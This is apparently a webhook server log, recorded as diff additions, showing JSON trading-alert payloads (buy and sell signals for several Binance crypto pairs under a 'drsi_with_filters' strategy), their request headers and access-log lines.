+'----------------------------2023-07-12 16:35:00-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '346'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'buy',
+ 'contracts': '0.0171',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:35:00Z',
+ 'interval': '1',
+ 'market_position': 'long',
+ 'market_position_size': '0.0086',
+ 'order_id': 'long',
+ 'price': '1886.6000000000001',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'ETHUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:36:02-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '329'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'buy',
+ 'contracts': '0.28',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:36:01Z',
+ 'interval': '1',
+ 'market_position': 'long',
+ 'market_position_size': '0.14',
+ 'order_id': 'long',
+ 'price': '97.26',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'LTCUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:36:03-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '330'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'buy',
+ 'contracts': '1.165',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:36:02Z',
+ 'interval': '1',
+ 'market_position': 'long',
+ 'market_position_size': '0.585',
+ 'order_id': 'long',
+ 'price': '22.5',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'SOLUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:39:01-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '344'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'sell',
+ 'contracts': '0.28',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:39:00Z',
+ 'interval': '1',
+ 'market_position': 'short',
+ 'market_position_size': '0.14',
+ 'order_id': 'short',
+ 'price': '96.24000000000001',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'LTCUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:40:01-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '341'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'buy',
+ 'contracts': '0.28',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:40:00Z',
+ 'interval': '1',
+ 'market_position': 'long',
+ 'market_position_size': '0.14',
+ 'order_id': 'long',
+ 'price': '96.46000000000001',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'LTCUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:53:02-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '335'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'sell',
+ 'contracts': '3.166',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:53:02Z',
+ 'interval': '1',
+ 'market_position': 'short',
+ 'market_position_size': '1.583',
+ 'order_id': 'short',
+ 'price': '66.16',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'COMPUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:58:00-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '337'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'sell',
+ 'contracts': '0.0171',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:58:00Z',
+ 'interval': '1',
+ 'market_position': 'short',
+ 'market_position_size': '0.0085',
+ 'order_id': 'short',
+ 'price': '1886.9',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'ETHUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:58:10-----------------------------'
+52.32.178.7 - - [12/Jul/2023 16:58:10] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001088
+(22288) accepted ('52.32.178.7', 55414)
+52.32.178.7 - - [12/Jul/2023 16:59:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001021
+(22288) accepted ('34.212.75.30', 31280)
+34.212.75.30 - - [12/Jul/2023 17:01:03] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001671
+(22288) accepted ('52.32.178.7', 40616)
+52.32.178.7 - - [12/Jul/2023 17:05:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.000993
+(22288) accepted ('52.32.178.7', 41320)
+52.32.178.7 - - [12/Jul/2023 17:05:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001019
+(22288) accepted ('34.212.75.30', 47270)
+34.212.75.30 - - [12/Jul/2023 17:07:05] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.000968
